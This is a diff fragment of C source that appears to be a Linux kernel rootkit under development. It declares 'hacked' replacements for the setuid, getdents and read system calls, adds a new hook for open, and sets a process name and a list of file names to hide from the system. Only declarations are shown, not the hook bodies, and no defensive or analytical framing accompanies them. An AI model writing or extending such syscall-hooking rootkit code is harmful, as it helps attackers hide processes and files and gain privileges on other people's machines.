@@ -56,12 +56,13 @@ struct linux_dirent {
 asmlinkage long (*orig_setuid)(uid_t uid);
 asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage long (*orig_read)(unsigned int fd, char *buf, size_t count);
+asmlinkage long (*orig_open)(const char __user *filename, int flags, umode_t mode);
 
 // Hacked system calls
 asmlinkage long hacked_setuid(uid_t uid);
 asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count);
+asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode);
 
 char *HIDDEN_PROCESS = "bash";
-
 const char * const HIDDEN_FILES[] = {"hideme.txt", "Makefile"};
